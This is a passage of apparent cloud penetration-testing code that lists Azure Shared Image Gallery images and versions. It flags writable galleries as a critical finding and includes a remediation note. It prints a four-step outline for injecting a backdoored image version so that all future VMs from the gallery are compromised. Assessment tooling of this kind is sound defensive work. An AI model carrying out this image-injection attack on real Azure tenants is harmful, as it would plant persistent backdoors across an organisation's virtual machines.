  if (images.exitCode !== 0) return { output: output.join("\n") + `[-] Failed: ${images.stderr.slice(0, 200)}`, findings }
  const imgList = tryJson(images.stdout) || []

  output.push(`[+] Images in ${galleryName}: ${imgList.length}`)
  for (const img of imgList) {
    output.push(`    ${img.name} — ${img.osType}, hyper-v: ${img.hyperVGeneration || "V1"}`)
    const versions = await az(["sig", "image-version", "list", "--gallery-name", galleryName, "--gallery-image-definition", img.name, "--resource-group", rg, "--query", "[].{name:name,state:provisioningState,date:publishingProfile.publishedDate}"], sub, timeout)
    if (versions.exitCode === 0) {
      const verList = tryJson(versions.stdout) || []
      for (const v of verList) output.push(`      version: ${v.name} (${v.state}) — ${v.date || "unknown"}`)
    }
  }

  output.push(`\n[!] Image injection steps:`)
  output.push(`    1. Create backdoored VM from existing image`)
  output.push(`    2. Generalize (sysprep/waagent) and capture`)
  output.push(`    3. Create new image version in gallery`)
  output.push(`    4. New VMs/VMSS using this image will be backdoored`)
  findings.push({
    checkId: "AZ-SIG-002",
    provider: "azure",
    severity: "critical",
    status: "READY",
    resource: `sig://${galleryName}`,
    title: `Shared Image Gallery writable: ${galleryName}`,
    details: "New image versions can backdoor all future VM deployments from this gallery",
    remediation: "Restrict gallery write access, enable image signing",
  })

  return { output: output.join("\n"), findings }
}
